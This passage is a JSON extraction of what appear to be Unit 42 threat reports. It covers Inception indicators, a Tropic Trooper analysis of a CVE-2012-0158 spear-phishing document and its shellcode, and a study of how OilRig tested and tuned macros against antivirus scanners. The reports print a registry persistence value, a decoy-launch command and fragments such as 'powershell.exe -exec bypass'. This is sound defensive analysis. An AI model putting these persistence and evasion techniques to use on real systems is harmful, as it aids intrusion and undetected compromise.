                "Although the malware is simple, its fairly effective, giving the attacker options on how to run their next, more sophisticated, payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Inception attacks continue to mostly stay under the radar, which in part is down to the effort put in by the attackers to make their attacks harder to analyze.",
                "In the latest wave of attacks, theyve done this through:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators of Compromise"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remote Template Documents where we have the matching payload"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "13de9678279b6ce6d81aeb32c0dd9f7458ad1f92aee17f3e052be9f06d473bed"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d547773733abef19f2720d4def2356d62a532f64bcb002fb2b799e9ae39f805f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remote templates analyzed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "687ee860fd5cd9902b441c26d72788d5a52052d03047a9b071808fc4c53a7e8b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "72eb022f395cc15bbe9582ee02f977ea0692932461a8b0bd608d9f0971125999"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PowerShower sample"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8aef4975d9c51821c4fa8ee1cbfe9c1f4a88c8784427d467ea99b2c1dabe15ae"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Other related templates and exploit documents from 2018"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "49dbcf1fc8d3381e495089f396727a959885c1dd2ab6cd202cf3c4dbd1d27c4f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8b212ee2d65c4da033c39aebaf59cc51ade45f32f4d91d1daa0bd367889f934d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cc64a68ba52283f6cf5521cf75567b3c5b5143f324d37c59906ee63f1bbafcaf"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2bcb8a4ddc2150b25a44c292db870124c65687444f96e078f575da69bbf018e0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Infrastructure"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 \u2013 IP Addresses associated with Inception Remote Template documents"
            ]
        }
    ],
    "6d419225c23964457b23ef228ef8d521dbcd02ac": [
        {
            "type": "paragraph",
            "content": [
                "Taiwan has been a regular target of cyber espionage threat actors for a number of years.",
                "Reasons for Taiwan being targeted range from being one of the sovereign states of the disputed South China Sea region to its emerging economy and growth with Taiwan being one of the most innovative countries in the High-Tech industry in Asia."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In early August, Unit 42 identified two attacks using similar techniques.",
                "The more interesting one was a targeted attack towards the Secretary General of Taiwan's Government office  Executive Yuan.",
                "The Executive Yuan has several individual boards which are formed to enforce different executing functions of the government.",
                "The Executive Yuan Council evaluates statutory and budgetary bills and bills concerning martial law, amnesty, declaration of war, conclusion of peace and treaties, and other important affairs.",
                "Given the important functions undertaken by the Executive Yuan office, it is not a surprise that they were targeted.",
                "The second attack was against an energy sector company also located in Taiwan."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attacks in this case are associated with a campaign called Tropic Trooper, which has been active since at least 2011 and is known for heavily targeting Taiwan.",
                "One of the attacks used their known Yahoyah malware, but the other attack deployed the widely available Poison Ivy RAT.",
                "This confirms the actors are using Poison Ivy as part of their toolkit, something speculated in the original Trend Micro report but not confirmed by them.",
                "Further analysis uncovered a handful of ties indicating the actors may also be using the PCShare malware family, which has not been previously tied to the group."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1 shows the spear phishing email which was sent to the Secretary General of Executive Yuan.",
                "The email is spoofed so that it appears as though it was sent from a staff member at the Democratic Progressive Party (DPP)."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1.",
                "Spear-phishing email with malicious attachment."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The document attached to this e-mail exploits CVE-2012-0158, a Microsoft Office vulnerability.",
                "This process is described in the Malware Analysis section later in this report, but one interesting aspect of this malicious was the decoy document the attacker chose to deploy."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As we have noted in many earlier reports, attackers commonly use decoy files to trick victims into thinking a malicious document is actually legitimate.",
                "After infecting the computer, the display a clean document to the victim that contains content that is relevant to them."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decoy document used in this case is a spreadsheet with four tabs, respectively titled example, 0720, 0721, and 1041109 full update.",
                "All of the text uses Traditional Chinese, in contrast to Simplified Chinese, which is the official written language of the People's Republic of China.",
                "Traditional Chinese is used in Taiwan, Hong Kong, Macau, and many overseas Chinese communities.",
                "The overarching theme of the spreadsheet is documenting protestor activity and/or progressive reform attempts in progress across Taiwan and the tone of the spreadsheet suggests it was compiled by progressive supporters.",
                "Because we were unable to find the spreadsheet online, and there is specific persona data included related to these movements and protests, we are not including any screen shots except for the one below."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2.",
                "The four tabs in the decoy spreadsheet."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The example spreadsheet tab is exactly as described  it contains the headers and suggested information within two of the remaining three tabs.",
                "The headers themselves translate, from left to right, to responsible department, issue, developments this week, political situation judgment, and related information.",
                "The tab labeled 0721 only has the matching headers and no additional information.",
                "None of the information in the spreadsheet relates to activities past 2015, and there are references made to the then upcoming January 16, 2016 elections in Taiwan.",
                "In that election the DPP won, displacing the Chinese Nationalist Party (KMT) for only the second time in history, and with Taiwans first female President."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The spreadsheet labeled 0720 refers to the Anti-Black Box Movement, which was a protest by Taiwanese high school students against certain proposed curriculum changes.",
                "The use of black box by the protestors is in reference to former Taiwanese President Ma Ying-Jeous government and its lack of transparency concerning government decisions.",
                "Protestors occupied Taiwans Ministry of Education last July.",
                "A resolution passed by Taiwans legislature and approved by the Executive Yuan in May of this year delayed implementing that curriculum until 2020 to allow time for the act to be amended."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Anti-Black Box Movement is related to the Sunflower Student Movement, a coalition of both student groups and other civic organizations that protested the Cross-Strait Trade Agreement between Taiwan and the PRC, feeling it would hurt Taiwans economy and increase the PRCs sway over the island.",
                "On March 17 2014, the KMT, the ruling party at the time, tried to force a vote without a previously agreed clause by clause review with the DPP.",
                "The following evening protesters occupied the Legislative Yuan, the first time that had occurred Taiwans history.",
                "On March 23 of the same year, after then President Ma re-affirmed he supported the pact and would not alter or drop it, protestors occupied the Executive Yuan where over 150 were injured and 61 arrested."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The final tab contains the most information of the three and has different headers.",
                "From left to right, the headers are titled responsible person(s), summary of issues and major groups, crisis simulation, political judgment, and recommendations, degree of tension, and participating members."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The documents attached to spear-phishing e-mails used in both attacks contain code that exploits CVE-2012-0158, which despite its age remains one of the most common Microsoft Word vulnerabilities being exploited by multiple threat actors.",
                "This matches with known Tactics, Techniques, and Procedures (TTPs) for Tropic Trooper, targeting both government institutions and also the energy industry in Taiwan."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The delivery document uses the XLSX extension typically used by OpenXML documents, but the file itself is actually an OLE (XLS) document.",
                "The file extension to file type discrepancy was caused by the actor using Excel's built-in encryption capability, which stores XLSX ciphertext and the information needed for decryption in an OLE document."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Filename: .xlsx\nMD5: a89b1ce793f41f3c35396b054dbdb749\nSHA1: f45e2342e40100b770d73dd06f5d9b79bfce4a72\nSHA256: 2baa76c9aa3834548d82a36e150d329e3268417b3f12b8f72d209d51bbacf671\nType: CDF V2 Document, No summary info\nSize: 327128 bytes"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1.",
                "Details of the malicious document attached to the e-mail."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The embedded shellcode enumerates open handles for a file with a size greater than 0xa6f0 (Decimal - 42736) bytes.",
                "It will then set the file pointer to 0xa6e8 (Decimal - 42728) and starts looking for the following delimiter:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "GfCv\\xef\\xfe\\xec\\xce"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If it finds this delimiter, the shellcode knows it is working with the correct file and continues by reading 0x600 (decimal 1536) bytes following this delimiter.",
                "The shellcode then decrypts the first 0xc0 (decimal 192)",
                "DWORDs of the data read from the file using an XOR algorithm that decrypts one DWORD of ciphertext at a time with 0x29f7c592.",
                "The resulting cleartext is a second piece of shellcode that continues carrying out further functionality."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The secondary shellcode starts by resolving the following API functions using a ROT13 hashing algorithm:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "kernel32.dll!CreateFileA\nkernel32.dll!ReadFile\nkernel32.dll!WriteFile\nkernel32.dll!SetFilePointer\nkernel32.dll!CopyFileA\nkernel32.dll!MoveFileExA\nkernel32.dll!CreateToolhelp32Snapshot\nkernel32.dll!Process32Next\nkernel32.dll!CloseHandle\nkernel32.dll!VirtualAlloc\nkernel32.dll!WinExec\nkernel32.dll!TerminateProcess\nkernel32.dll!LoadLibraryA\nkernel32.dll!lstrlenA\nkernel32.dll!lstrcpyA\nkernel32.dll!lstrcatA\nkernel32.dll!GetTempPathA\nkernel32.dll!WideCharToMultiByte\nkernel32.dll!QueryDosDeviceA\nntdll.dll!NtQueryObject\nadvapi32.dll!RegOpenKeyA\nadvapi32.dll!RegSetValueExA\nadvapi32.dll!RegCloseKey"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Immediately following these API functions there are three DWORDS; one used to locate the payload embedded within the exploit file, one for the size of the payload, and one for the size of decoy document.",
                "The two size values are added together to get the length of the ciphertext that the shellcode will decrypt.",
                "In the sample we analyzed, the following values were present, showing that the payload is at offset 0xabc0 and has a size of 0x45218:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "DWORD offset_toPayload; (0ABC0h)\nDWORD payload_Size; (1C600h)\nDWORD decoy_Size; (28C18h)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The shellcode then creates a string that it uses to create a registry key to automatically run the final payload each time the system starts.",
                "It then opens the registry key 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' and sets the value to the \"Shell\" subkey to the previously created string.",
                "Ultimately, the following registry key is created for persistence:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell:\n\"explorer.exe,rundll32.exe \"C:\\Documents and Settings\\Administrator\\Application\nData\\Identities\\Identities.ocx\" SSSS\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It then uses the \"offset_toPayload\" value as an offset that it will read 283160 (45218h) bytes from the XLS file.",
                "The shellcode then enters a decryption loop to convert the embedded payload from ciphertext to cleartext.",
                "The algorithm uses the length of the ciphertext negated as the initial encryption key, which it bit rotates right by 1 to adjust the key for each of decryption.",
                "It will use this key to decrypt four bytes of the ciphertext with the XOR operation until all the ciphertext is decrypted.",
                "During each iteration of the decryption process, the algorithm will check to make sure the four bytes of ciphertext are not equal to the key or equal to zero before decrypting the ciphertext.",
                "The following table contains the first five rounds of the algorithm to explain the decryption process:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2.",
                "Decrypting the payload"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As you can see from the table above, the algorithm decrypts what is an embedded portable executable that acts as the payload in this attack.",
                "The embedded payload is written to %APPDATA\\Identities\\Identities.ocx and has the following attributes:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decoy document, described in the section above, is saved to %TEMP%\\.xlsx and has the following attributes:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The shellcode will move the decoy document to the location of the originally executed XLSX file and will create the following command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cmd /c start excel /e <path to original XLSX file, now decoy\ndocument>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Before running the above command to open the decoy document, the shellcode enumerates the running processes on the system, specifically looking for processes created for an executable with a filename that starts with avp., presumably in an attempt to find Kasperskys antivirus process.",
                "If the process is found, the shellcode will not open the decoy document and exits."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The shellcode does not launch the payload, rather it relies on the registry key it created for persistence to execute the payload when the user reboots the system, meaning during dynamic analysis the execution of the payload may be missed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the system starts up, the persistence registry key will launch the Identities.ocx payload and call its SSSS exported function.",
                "The SSSS function checks to make sure that the DLL is running within the context of a rundll32.exe process and then begins piecing 0x141B bytes of data together in the correct order to build the shellcode of the Poison Ivy Trojan."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We found and parsed the following configuration from the Poison Ivy shellcode:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Looking for more samples which exhibited the same file structure, encryption and obfuscation to deliver the above Poison Ivy sample yielded only two additional samples.",
                "In the other two instances the delivered payloads were respectively PCShare and Yahoyah.",
                "PCShare has not been previously associated with Tropic Trooper, but in addition to the aforementioned overlaps, the two samples have passive DNS overlap with some known Tropic Trooper infrastructure.",
                "For those reasons, we assess with limited confidence the group is also using this malware family."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3.",
                "The limited ties between C2 infrastructure used by Yahoyah samples (top) and PCShare malware samples (bottom)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The below table shows the details of the documents, payload delivered and the C2 servers used for communications."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It is interesting to see that the exploit documents we found had either low or no detections on most popular antivirus engines, showing that the threat actors behind this campaign have been having considerable success in bypassing static analysis undertaken by traditional antivirus solutions with this technique."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We further expanded our search using the AutoFocus Threat Intelligence platform on the IOCs extracted from the PIVY, PCShare and Yahoyah payloads and found 42 samples which either matched unique behaviors, the unique PIVY mutex or had common C2 infrastructure.",
                "The hashes of all the samples found are given in the appendix section at the end of this blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4 below shows the compilation timestamps of the payload samples found using AutoFocus.",
                "Given some of the payloads that were used in recent attacks, which were compiled months before, it shows that the threat actor group continues to reuse the payload within their exploit documents."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4. Payload Compilation Timelines"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The below Maltego graph shows some of the shared infrastructure which have been used by Tropic Trooper.",
                "The complete list of indicators on the graph can also be found in the appendix section of this report."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Maltego graph of Tropic Trooper infrastructure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Tropic Trooper threat actor group has been known to target governments and organizations in the Asia Pacific region for at least six years.",
                "In addition to using Yahoyah malware, we were able to confirm they are also using Poison Ivy and possibly PCShare malware families.",
                "They are also still exploiting CVE 2012-0158, as are many threat actors.",
                "Palo Alto Networks customers are protected from Tropic Troopers malicious activities by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Autofocus customers can discover additional information on Tropic Trooper via the following AutoFocus tags:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Samples matching unique indicators, behaviors and C2 infrastructure from the payload extracted out of the malicious documents:"
            ]
        }
    ],
    "d85a57fd9acc39d677df11043b512421caa36e4a": [
        {
            "type": "paragraph",
            "content": [
                "Gaining insight into an adversarys operational tempo in the early phases of the attack lifecycle can be very difficult.",
                "Typically, there are far fewer data points available to analyze in the reconnaissance and weaponization phases for a researcher to use to determine how quickly an adversary operates prior to direct interaction with a target in the delivery phase.",
                "While continuing research on the August 2018 attacks on a middle eastern government that delivered BONDUPDATER, Unit 42 researchers observed OilRigs testing activities and with high confidence links this testing to the creation of the weaponized delivery document used in this attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Clearly, OilRig incorporates a testing component within their development process, as we have previously observed OilRig performing testing activities on their delivery documents and their TwoFace webshells.",
                "This testing component often involves making small modifications to their delivery documents and submitting these files to online public anti-virus scanning tools to determinethemaliciousness of a submitted file and to figure out how to evade these detections.",
                "Providing a free and quick anti-virus testing service, using these online scanners aids an attacker in understanding which anti-virus engine detects their malware, thus giving the attacker a metaphorical quality assurance service."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To determine OilRigs operational tempo, we compared the creation times of the files created during testing, the creation time of the delivery document and the time in which the spear-phishing email was sent in the attack.",
                "We found that OilRig began its testing activities just under 6 days prior to the targeted attack and performed three waves of testing attempts on August 20th, 21st, and 26th.",
                "The tester created the final test file less than 8 hours before the creation time of a delivery document, which was then delivered via a spear-phishing email 20 minutes later."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "OilRigs",
                "Testing Activities"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While investigating recent attacks performed by the threat actor group OilRig using their new Bondupdater version, Unit 42 researchers searched for additional Microsoft Office documents used by OilRighoping to locate additional malware being used in other attacks during the same time period.",
                "We focused on the functionality and pivoting off the original OilRig Microsoft documents found during our recent investigation."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unit 42 researchers found 11 additional samples that were submitted across several public anti-virus testing sites, as seen in Table 1.These samples appeared to have been created by OilRig during their development and testing activities, all of which share many similarities with the delivery document used in the recent OilRig attack against a Middle Eastern government, N56.15.doc (7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00) that we have also included in Table 1.",
                "During this testing, we saw document filenames that contain the C2 we witnessed in the targeted attack above, specifically the filenames XLS-withyourface.xlsandXLS-withyourface test.xls.",
                "The similarities in metadata, macro code, and the filenames containing the C2 domain name leads us to believe these files were in fact OilRig testing their code prior to use in the targeted attack that happened on August 26th.",
                "It is interesting to note that while all the testing files were Microsoft Excel documents, the actual file used in the targeted attack was a Microsoft Word document."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Files generated during testing activities and the document delivered in the related targeted attack"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The metadata within the Microsoft Excel spreadsheets seen in Table 1 shows the OilRig developer began creating these testingdocuments on August 20, six days prior to the related targeted attack.",
                "All of the testing activity performed by OilRig occurred prior to their attack on August 26th.",
                "When cross referencing the Last Modified Date dates across the testing and attack activity, it is easy to draw a timeline of activity, as seen in the timeline in Figure 1."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1\u00a0Timeline of Testing and Attack Activity"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "On August 20, 22 anti-virus engines detected the first iteration ofXLS-withyourface.xlsas malicious, as seen in the chart in Figure 2.",
                "Over the next seven minutes, the tester created two more samples whose detections lowered from 16 detections to six, respectively.",
                "Ultimately, thedetection count was lowest early on August 21, still five days prior to the targeted attack.",
                "The timeline in Figure 1 shows a gap in testing activity between August 21st and August 26th, when the tester stopped their activities.",
                "However, they later continued by making modifications to the Excel document just prior to the attack on August 26th.",
                "The last iteration of testing occurring less than 8 hours before the creation time of the Word delivery document used in the targeted attack."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Detection rate compared to the insertions and deletions that were performed in each iteration of testing"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The chart in Figure 2 shows the detection rate of the file fell or rose as the tester modified the spreadsheet during each iteration of testing.",
                "These changes in detection rates allow the tester to determine if the modified portion of the file was causing detection.",
                "When analyzing this testing activity, we compared the number of changes performed in each iteration, specifically the number of lines inserted and deleted based on the GitHub file diff, to the number of detections to determine if the amount of changes had an obvious effect on the detection rate.",
                "Figure 2 shows that iterations 1 and 2, with only minimal changes, resulted in a massive drop in detections, whereas iterations 3 and 4, with a large number of changes, resulted in a small drop and large increase in detections."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At a high level, the quantity of changes is not necessarily important to the tester, rather the quality of the changes helps the tester lower the detection rate while providing information on how to evade these detections.",
                "An example of a quality change was the removal of the line of code that runs the dropped VBScript using wscript in Iteration 2, which lowered the detection rate from 16 to 6.",
                "Ultimately, the tester used the knowledge gained from these testing iterations to create a delivery document that was more difficult to detect and likely to result in a successful attack.",
                "For details on the changes made in each iteration, please reference the analysis in the Appendix."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "What Did OilRig Learn?"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During OilRigs development efforts, the actors were clearly learning and adapting their development techniques.",
                "We continually witnessed the attackers submit their files to testing services only to make changes and resubmit to determine the specific contents of the file that cause anti-virus detections.",
                "The OilRig actors used the knowledge learned in this process to develop a delivery document that would evade detection, thus increasing the chances of a successful attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Doing a differential comparison between each of the documents, allowed Unit 42 researchers to watch each iteration of code, giving a unique perspective into not only how OilRig performed their testing, but also what the actors may have learned during their efforts to lower the detection of their delivery documents.",
                "While its impossible for us to say for certain what OilRig learned ,we can make some assumptions as to what they likely learned:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "What Did We Learn?"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Similar to the way OilRig learned to better circumvent detections, we as researchers also learned as we looked at each of the iterations.",
                "Providing us with learning opportunities helps us understand the threat actors techniques and capabilities, as well as better pro-actively build protection mechanisms."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We learned that OilRig:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After performing this analysis, we believe the OilRig actors used the macro from the malicious Excel document as the basis for the malicious Word document we discussed in our blog.",
                "We believe with high confidence that this macro was used to create the delivery document based on the following similarities:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It appears that OilRig actors modified the macro used in the testing activity to create the weaponized delivery document.",
                "The modifications involved adding a function named HGHG to save the obfuscated BONDUPDATER PowerShell script to a file.",
                "OilRig also changed the variable used to store the VBScript to a variable named A in the weaponized Word document instead of DDDD as witnessed in the testing Excel documents.",
                "Lastly, the actors removed the function AA from the macro, as this function displays a hidden spreadsheet that would contain the decoy content, which is specific to Excel and not needed for the Word document."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Attackers and groups routinely use file and URL scanning services to help develop and modify their malware to evade detections.",
                "We were already familiar with OilRigs testing and development efforts as discussed in our previous blog, and we continually watch for changes to OilRigs development techniques to give us insight into their methods.",
                "Gaining this developmental insight sheds light on OilRigs advanced capabilities, giving us a more complete threat actor profile."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Closely examining the development methodologies of attack groups gives researchers unique opportunities to develop an understanding of actor tools, tactics, and procedures.",
                "Comparison between what malware is eventually used in active campaigns versus in-development malware allows us to understand what adaptations and modifications were made to each iteration of malware.",
                "Additionally, witnessing specific functionality changes within the malware itself, we attempt to make correlations between the new and old functionality.",
                "We were also able to gain insight into OilRigs operational tempo by comparing the timestamps of files created during testing and the file delivered in an actual attack.",
                "We determined that OilRig began their testing activities 6 days prior to an attack, which ended 8 hours before the creation of the document that the actors delivered via a spear-phish email 20 minutes later."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While OilRig remains active, Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This appendix contains the analysis we performed on each iteration of testing.",
                "Before the analysis of each iteration, we have included some additional information about the files and the detection rate, as seen and described in Table 1."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Additional data provided for each Iteration of testing"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The analysis portion of each iteration includes a description of the changes made to the macro in the delivery document.",
                "These changes are also visualized in screenshots of diffs between the two files compared in that iteration.",
                "When looking at the diff screenshots, lines with a red background were removed from a file, while lines with a green background were added to the file."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Iteration 0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The first known file associated with this testing activity does not appear to be the original document created by the actor.",
                "We believe this is the case because this Excel spreadsheet contains a stream named __SRP_0 that appears to have artifacts from a previous version of this delivery document.",
                "The __SRP_0 stream contains artifacts, specifically a series of base64 encoded strings that when decoded are almost an exact copy of the BONDUPDATER PowerShell payload named AppPool.ps1 that was dropped by 7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00 discussed in our blog discussing OilRigs attack on a middle eastern government in August 2018.",
                "In Figure 2 below, we compared the decoded base64 strings from __SRP_0 to the AppPool.ps1 file that was discussed in our previous blog, which shows the exact same content (including withyourface[.]com C2) with the only differences being newlines and spaces."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Comparison of previous BONDUPDATER payload with payload extracted from cached stream"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When we analyzed this specific sample, we noticed that the tester has changed the method in which the PowerShell payload is dropped to the system from the malicious Word document discussed in our blog.",
                "Instead of writing the AppPool.ps1 file from the macro, the macro in this malicious Excel document only writes the AppPool.vbs, which the macro will run using wscript.",
                "The VBScript is then responsible for writing AppPool.ps1 to the system, which is the main difference from the Word documents method discussed in our previously mentioned blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Also, it appears the tester removed the BONDUPDATER payload from the sample altogether, as the AppPool.vbs script uses an empty variable named mysrc that it would have used to store the base64 encoded payload, which it would decode and save to the AppPool.ps1 file."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As mentioned earlier, we believe this testing activity preceded the attack that used the Word delivery document discussed in our blog.",
                "We also believe that this was not the only round of testing performed by the threat group, as the BONDUPDATER tool existing in the __SRP_0 stream suggests that the tester had created a prior document that contained the payload that was removed from this testing activity.",
                "It is possible that the tester had previously performed testing activities on the PowerShell payload and removed it to isolate their current testing activities on the macro portion of the delivery document."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Iteration 1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this iteration, the tester made one simple change, which involved removing the string powershell.exe from being written to the AppPool.vbs file.",
                "This change essentially breaks the installation process, as the VBScript would no longer be able to run the AppPool.ps1 run correctly; however, the tester made this change to determine if detection stemmed from this string.",
                "The diff in the screenshot in Figure 3 does not make the missing powershell.exe string immediately apparent, however, if you look for Shell0 on line 24 you can see powershell.exe -exec bypass in the left (red) text and  -exec bypass in the right (green) text."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Screenshot of diff between files related to Iteration 1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Iteration 2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this iteration, the tester removed the line responsible for running the AppPool.vbs script using the wscript application.",
                "As you can see in Figure 4, the tester just removed the entire line of code and replaced it with a new line."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Screenshot of diff between files related to Iteration 2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Iteration 3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this iteration, the tester made fairly significant changes to the macro.",
                "First, the tester introduced a line of code that would sleep for 10 seconds after creating the C:\\ProgramData\\WindowsAppPool folder and before writing the AppPool.vbs file to this folder, which can be seen in Figure 5 at line 12.",
                "The bottom of Figure 5 and continued into Figure 6 shows that the tester also added the base64 encoded BONDUPDATER PowerShell payload to the DDDD variable instead of the VBScript seen in previous versions of this macro.",
                "The base64 encoded BONDUPDATER included here is the exact same payload in the first testing samples cached __SRP_0 stream mentioned in Iteration 0.",
                "Figure 7 also shows that the tester removed the line that set the Shell0 variable to contain the wscript.shell object that it would theoretically use to run the VBScript."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Screenshot of diff between files related to Iteration 3 showing sleep code and other objects added"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Screenshot of diff between files related to Iteration 3 showing changes to variable used to store VBScript"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 Screenshot of diff between files related to Iteration 3 showing removal of the \u2018wscript.shell\u2019 object"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Iteration 4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this iteration, the tester replaces the base64 encoded PowerShell script in the macro with the VBScript that it replaced in the previous iteration.",
                "The tester also removed some lines of code that instantiated the Scripting.",
                "FileSystemObject and Wscript.",
                "Shell objects (line 17 and 18 in Figure 8)."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 Screenshot of diff between files related to Iteration 4 showing VBScript added back to the macro"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It appears that the tester reintroduced the VBScript to the macro, albeit with slight modification.",
                "The two modifications to the VBScript stored in the DDDD variable come in the form of obfuscating two of the strings within the script, specifically the powershell (line 24 in Figure 9) and cmd.exe (line 25 in Figure 9) strings.",
                "Instead, both of these strings were constructed one character at a time using the hexadecimal value for each character and concatenated together.",
                "For instance, the powershell string was replaced with the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The tester also added a line (line 29 in Figure 9) that uses the built-in Shell function to run the AppPool.vbs script using the wscript application.",
                "The tester used the vbHide flag in the call to the Shell function, which will run the command in a hidden window."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9 Screenshot of diff between files related to Iteration 4 showing string obfuscation and use of the built-in Shell function"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Iteration 5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this iteration, the tester removes the call to the built-in Shell function that runs the AppPool.vbs script using wscript that they introduced in the previous iteration.",
                "Figure 10 shows that the tester removed the code on line 29 by replacing it with an empty line."
            ]
        },
        {
